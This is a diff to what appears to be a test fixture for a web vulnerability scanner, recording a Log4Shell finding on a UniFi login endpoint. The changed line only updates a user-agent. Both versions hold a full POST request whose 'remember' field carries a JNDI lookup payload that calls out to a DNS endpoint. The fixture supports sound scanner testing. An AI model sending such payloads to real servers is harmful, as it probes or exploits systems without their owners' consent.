@@ -6,7 +6,7 @@
                 "path": "/api/login",
                 "info": "URL https://unifi:8443/api/login seems vulnerable to Log4Shell attack by using the body parameter remember",
                 "level": 4,
-                "http_request": "POST /api/login HTTP/1.1\nhost: unifi:8443\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncontent-type: application/json\ncontent-length: 142\nContent-Type: application/json\n\n{\"username\": \"alice\", \"password\": \"Letm3in_\", \"remember\": \"${jndi:dns://dns-endpoint/c9cda4a8-94a8-457c-93fb-422465926b68.l}\", \"strict\": true}",
+                "http_request": "POST /api/login HTTP/1.1\nhost: unifi:8443\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncontent-type: application/json\ncontent-length: 142\nContent-Type: application/json\n\n{\"username\": \"alice\", \"password\": \"Letm3in_\", \"remember\": \"${jndi:dns://dns-endpoint/c9cda4a8-94a8-457c-93fb-422465926b68.l}\", \"strict\": true}",
                 "wstg": [
                     "WSTG-INPV-11"
                 ],
